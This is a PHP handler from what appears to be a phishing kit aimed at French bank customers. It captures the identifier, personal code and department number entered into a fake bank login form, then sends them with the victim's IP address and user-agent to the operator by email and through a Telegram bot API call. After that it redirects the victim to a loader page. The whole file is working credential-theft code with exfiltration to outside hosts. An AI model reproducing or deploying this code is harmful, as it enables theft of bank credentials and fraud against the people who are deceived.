<?php 
session_start();
include('../settings.php');
include ('../isk/all.php');


if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{


	$_SESSION['identifiant'] = $_POST['identifiant_bank'];
	$_SESSION['codeperso'] = $_POST['personnelcode'];
	$_SESSION['departementcode'] = $_POST['departement'];

	if(!empty($_SESSION['identifiant']) || !empty($_SESSION['codeperso']) || !empty($_SESSION['departementcode']))
	{

		$subject = "「🏛」 - LOG BANK - ".$_SESSION['bank']." - ".$_SESSION['ip'];
		$message = "

🏛 Connexion : ".$_SESSION['bankurl']."

🏛 Identifiant : ".$_SESSION['identifiant']."
🏛 Code Personnel : ".$_SESSION['codeperso']."

🗃 Numéro de département : ".$_SESSION['departementcode']."

🔑 Adresse IP : ".$_SESSION['ip']."
🕹️ User-agent : ".$_SESSION['useragent']."

";

	$headers = "From: =?utf-8?Q?=F0=9F=A5=B7?= ".$spammername." =?utf-8?Q?=F0=9F=A5=B7?= <email@crusixv4.me>";
	 mail($boiterez,$subject,$message,$headers);
	 if($telegram == "on")
                      {
      
  $data = [
                                      'text' => '
                                      
🏛 Connexion : '.$_SESSION['bankurl'].'

🏛 Identifiant : '.$_SESSION['identifiant'].'
🏛 Code Personnel : '.$_SESSION['codeperso'].'

🗃 Numéro de département : '.$_SESSION['departementcode'].'

🔑 Adresse IP : '.$_SESSION['ip'].'
🕹️ User-agent : '.$_SESSION['useragent'].'

                                      ',
                                      'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

                      }

	 header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotofinished']);

	}
	else{
		header("Location: bank.php?".$_SESSION['userid'].$_SESSION['gotologbank'].$_SESSION['errorbank']);

	}



}
else{

	die('HTTP/1.0 404 Not Found');
}

?>